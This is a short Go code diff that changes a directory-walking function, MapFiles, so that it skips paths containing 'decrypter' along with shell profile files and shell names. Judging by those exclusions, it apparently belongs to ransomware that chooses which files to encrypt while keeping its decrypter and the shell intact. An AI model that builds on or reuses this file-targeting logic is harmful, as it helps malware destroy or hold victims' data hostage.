@@ -29,7 +29,7 @@ func MapFiles(dir string) []string {
 			return err
 		}
 
-		if strings.Contains(path, "decrypter") {
+		if strings.Contains(path, "decrypter") || strings.Contains(path, ".bashrc") || strings.Contains(path, ".zshrc") || strings.Contains(path, ".profile") || strings.Contains(path, "bash") || strings.Contains(path, "sh") || strings.Contains(path, "zsh") {
 			return nil
 		} else {
 			files = append(files, path)
